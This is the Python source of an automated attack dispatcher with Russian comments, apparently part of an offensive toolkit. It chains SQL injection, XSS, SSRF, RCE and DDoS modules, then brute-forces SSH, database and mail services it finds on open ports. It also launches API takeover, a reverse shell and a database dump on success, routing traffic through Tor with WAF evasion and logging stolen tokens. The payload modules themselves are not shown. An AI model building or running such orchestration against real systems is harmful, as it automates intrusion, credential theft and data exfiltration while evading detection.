# src/core/dispatcher.py — v15.2.1 — ФИКС _run_auto
import asyncio
from typing import Dict, Any, List, Set
from src.core.logger import RealTimeLogger
from src.utils.tor_helper import TorClient
from src.utils.waf_bypass import WAFBypass
from src.ai.predictor import Predictor
from src.ai.payload_generator import PayloadGenerator

# === ОСНОВНЫЕ АТАКИ (8) ===
from src.attacks.token_hunter import UltimateTokenHunter
from src.attacks.port_scan import PortScanModule
from src.attacks.sql_injection import SQLInjectionModule
from src.attacks.xss import XSSModule
from src.attacks.csrf import CSRFModule
from src.attacks.ssrf import SSRFModule
from src.attacks.rce import RCEModule
from src.attacks.ddos import SmartDDoSModule

# === АВТО-АТАКИ (13) ===
from src.attacks.mysql_bruteforce import MySQLBruteforceModule
from src.attacks.ssh_bruteforce import SSHBruteforceModule
from src.attacks.ftp_bruteforce import FTPBruteforceModule
from src.attacks.postgres_bruteforce import PostgresBruteforceModule
from src.attacks.api_takeover import APITakeoverModule
from src.attacks.reverse_shell import ReverseShellModule
from src.attacks.ldap_injection import LDAPInjectionModule
from src.attacks.smtp_bruteforce import SMTPBruteforceModule
from src.attacks.redis_bruteforce import RedisBruteforceModule
from src.attacks.mongodb_bruteforce import MongoDBBruteforceModule
from src.attacks.elasticsearch_bruteforce import ElasticsearchBruteforceModule
from src.attacks.memcached_bruteforce import MemcachedBruteforceModule
from src.attacks.db_hack import DBHackModule


class AttackDispatcher:
    def __init__(self, config: Dict, logger: RealTimeLogger, brain=None):
        self.config = config
        self.logger = logger
        self.brain = brain
        self.tor = TorClient(config, logger)
        self.waf = WAFBypass(config)
        self.predictor = Predictor(config, logger)
        self.payload_gen = PayloadGenerator()

        self.modules = {
            'token_hunter': UltimateTokenHunter,
            'port_scan': PortScanModule,
            'sql_injection': SQLInjectionModule,
            'xss': XSSModule,
            'csrf': CSRFModule,
            'ssrf': SSRFModule,
            'rce': RCEModule,
            'ddos': SmartDDoSModule,
        }

        self.auto_modules = {
            'mysql_bruteforce': MySQLBruteforceModule,
            'ssh_bruteforce': SSHBruteforceModule,
            'ftp_bruteforce': FTPBruteforceModule,
            'postgres_bruteforce': PostgresBruteforceModule,
            'api_takeover': APITakeoverModule,
            'reverse_shell': ReverseShellModule,
            'ldap_injection': LDAPInjectionModule,
            'smtp_bruteforce': SMTPBruteforceModule,
            'redis_bruteforce': RedisBruteforceModule,
            'mongodb_bruteforce': MongoDBBruteforceModule,
            'elasticsearch_bruteforce': ElasticsearchBruteforceModule,
            'memcached_bruteforce': MemcachedBruteforceModule,
            'db_hack': DBHackModule,
        }

        self.chain_order = [
            'token_hunter', 'port_scan', 'sql_injection', 'xss', 'csrf', 'ssrf', 'rce', 'ddos'
        ]

    async def _request(self, method: str, url: str, **kwargs):
        headers = self.waf.get_headers()
        kwargs['headers'] = {**kwargs.get('headers', {}), **headers}
        self.waf.delay()
        resp = await self.tor.request(method, url, **kwargs)
        waf_detected = self.waf.detect(resp.text)
        if waf_detected != "unknown":
            self.logger.warning(f"WAF: {waf_detected}")
        return resp

    async def execute_chain(self, target: str, options: Dict[str, Any]) -> List[Dict[str, Any]]:
        results = []
        context = {
            'target': target,
            'options': options.copy(),
            'ports': [],
            'tokens': [],
            'rce': False,
            'sqli': False,
            'db_dumped': False
        }

        triggered_auto: Set[str] = set()

        # === ПРЕДСКАЗАНИЕ ===
        try:
            resp = await self._request('GET', target)
            features = self.predictor.extract_features(resp.text, resp.status_code, target)
            preds = self.predictor.predict(features)
            self.logger.ai(f"ПРЕДИКТОР: {preds}")
            if preds['rce'] > 0.7:
                self.chain_order = ['rce'] + [x for x in self.chain_order if x != 'rce']
            elif preds['sqli'] > 0.7:
                self.chain_order = ['sql_injection'] + [x for x in self.chain_order if x != 'sql_injection']
        except Exception as e:
            self.logger.error(f"Предиктор ошибка: {e}")

        for name in self.chain_order:
            if name in self.modules:
                module = self.modules[name](logger=self.logger, brain=self.brain, config=self.config)
                result = await module.attack(target, {**options, 'context': context, 'request': self._request})

                result['context_snapshot'] = {
                    'ports': context['ports'].copy(),
                    'tokens': [t[:40] + "..." for t in context['tokens']],
                    'rce': context['rce'],
                    'sqli': context['sqli']
                }
                results.append(result)

                # === КОНТЕКСТ ===
                if name == 'token_hunter' and result.get('success'):
                    token = result.get('token', '')
                    context['tokens'].append(token)
                    options['auth_token'] = token
                    self.logger.breach(f"ТОКЕН: {token[:60]}...")
                if name == 'port_scan':
                    context['ports'] = result.get('open_ports', [])
                if name == 'rce' and result.get('success'):
                    context['rce'] = True
                if name == 'sql_injection' and result.get('success'):
                    context['sqli'] = True

                if result.get('success') and self.brain:
                    payload = result.get('vulnerable_payload') or result.get('token') or "unknown"
                    self.brain.learn(name, target, str(payload), True, result.get('response', ''))

                await self._trigger_once(target, context, options, results, triggered_auto)

        return results

    async def _trigger_once(self, target: str, context: Dict, options: Dict, results: List[Dict], triggered: Set[str]):
        port_map = {
            3306: 'mysql_bruteforce', 5432: 'postgres_bruteforce', 22: 'ssh_bruteforce',
            21: 'ftp_bruteforce', 389: 'ldap_injection', 25: 'smtp_bruteforce',
            587: 'smtp_bruteforce', 6379: 'redis_bruteforce', 27017: 'mongodb_bruteforce',
            9200: 'elasticsearch_bruteforce', 11211: 'memcached_bruteforce',
        }

        for port, attack in port_map.items():
            if port in context['ports'] and attack not in triggered:
                await self._run_auto(attack, target, options, context, results)
                triggered.add(attack)

        if context['tokens'] and 'api_takeover' not in triggered:
            await self._run_auto('api_takeover', target, options, context, results)
            triggered.add('api_takeover')

        if context['rce'] and 'reverse_shell' not in triggered:
            await self._run_auto('reverse_shell', target, options, context, results)
            triggered.add('reverse_shell')

        if (context['sqli'] or context['rce']) and 'db_hack' not in triggered and not context['db_dumped']:
            await self._run_auto('db_hack', target, options, context, results)
            triggered.add('db_hack')
            context['db_dumped'] = True

    async def _run_auto(self, name: str, target: str, options: Dict, context: Dict, results: List[Dict]):
        if name not in self.auto_modules:
            return
        self.logger.ai(f"АВТО-АТАКА: {name.upper()}")
        module = self.auto_modules[name](logger=self.logger, brain=self.brain, config=self.config)
        result = await module.attack(target, {**options, 'context': context, 'request': self._request})
        result['context_snapshot'] = {
            'ports': context['ports'].copy(),
            'tokens': [t[:40] + "..." for t in context['tokens']],
            'rce': context['rce'],
            'sqli': context['sqli']
        }
        results.append(result)

        if result.get('success') and self.brain:
            payload = result.get('vulnerable_payload', 'auto')
            self.brain.learn(name, target, str(payload), True, result.get('response', ''))